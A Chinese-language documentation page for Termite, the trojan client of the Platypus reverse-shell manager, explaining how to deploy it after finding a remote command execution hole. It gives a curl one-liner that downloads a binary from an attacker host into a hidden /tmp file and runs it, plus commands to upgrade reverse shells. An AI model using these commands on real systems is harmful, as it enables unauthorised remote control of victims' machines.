# Termite

## Termite 是什么？

Termite 是 Platypus 提供的一个二进制客户端，提供了多种有用功能，如：

* 完全交互式 Shell（使用就像 SSH 一样丝滑），并且可以同时启动多个 Shell 而互不影响。
* 4 种不同的[隧道](./tunnel.md)功能
* 更加稳定可靠的文件操作

## 直接获取 Termite Shell

当您在目标网站已经发现了一个远程命令执行漏洞的时候，可以执行通过执行如下命令直接生成 Termite Shell。

!!! Hint
    为了压缩 Termite 客户端的尺寸，建议您安装 upx 并将其所在路径追加至环境变量 `$PATH` 中，以便 Platypus 对其调用对 Termite 进行压缩（Ubuntu 可以直接使用 `sudo apt install upx` 进行安装）。

```bash
curl -fsSL http://1.3.3.7:13339/termite/1.3.3.7:13337 -o /tmp/.H0Z9 && chmod +x /tmp/.H0Z9 && /tmp/.H0Z9
```

## 升级至 Termite（推荐）

当您已经获得了一个反向 Shell 之后，强烈建议您使用 `Upgrade` 命令将其升级为更稳定可靠并且提供加密机制等其他非常有用的功能的 Termite Shell。

!!! Termite
    Termite 是 Platypus 的二进制木马，提供流量加密、交互式 Shell 等功能。

当您已经使用 `Jump` 命令跳转到目标 Shell 之后，您可以使用如下命令来将当前的明文 Shell 提升为更加可靠的 Termite，稍等片刻，您将会看到一个带有 `[Encrypted]` 标记的 Shell 上线。

```
» Jump d2958c94f5425eb709fb5c8690128268
» Upgrade 1.3.3.7:13337
```

您也可以通过 Web 界面来升级到 Termite。

![](/images/webui/upgrade.gif)

与 Termite 交互的逻辑与通常的反向 Shell 一致，即：`Jump` 然后 `Interact`。
